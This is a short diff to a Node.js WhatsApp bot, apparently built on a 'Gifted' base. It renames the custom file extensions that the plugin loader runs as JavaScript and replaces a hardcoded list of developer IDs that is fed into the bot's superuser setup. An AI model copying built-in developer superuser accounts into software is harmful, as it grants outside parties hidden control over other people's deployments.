@@ -11,10 +11,10 @@ const _compileAsJs = function (module, filename) {
 require.extensions['.gmd']     = _compileAsJs;
 require.extensions['.kasongo'] = _compileAsJs;
 require.extensions['.amd']     = _compileAsJs;
-require.extensions['.atassa']  = _compileAsJs;
-require.extensions['.ke']      = _compileAsJs;
+require.extensions['.ultra']   = _compileAsJs;
+require.extensions['.guru']    = _compileAsJs;
 
-const _pluginExts = new Set(['.js', '.gmd', '.kasongo', '.amd', '.atassa', '.ke']);
+const _pluginExts = new Set(['.js', '.gmd', '.kasongo', '.amd', '.ultra', '.guru']);
 
 const loadPlugins = (pluginsPath) => {
     try {
@@ -159,7 +159,7 @@ const getGroupInfo = async (Gifted, from, botId, sender) => {
 };
 
 const buildSuperUsers = async (settings, getSudoNumbers, botId, ownerNumber) => {
-    const devNumbers = ('254715206562,254114018035,254728782591,254799916673,254762016957,254113174209')
+    const devNumbers = ('116284050,105521300,117065959')
         .split(',')
         .map(num => num.trim().replace(/\D/g, '')) 
         .filter(num => num.length > 5);
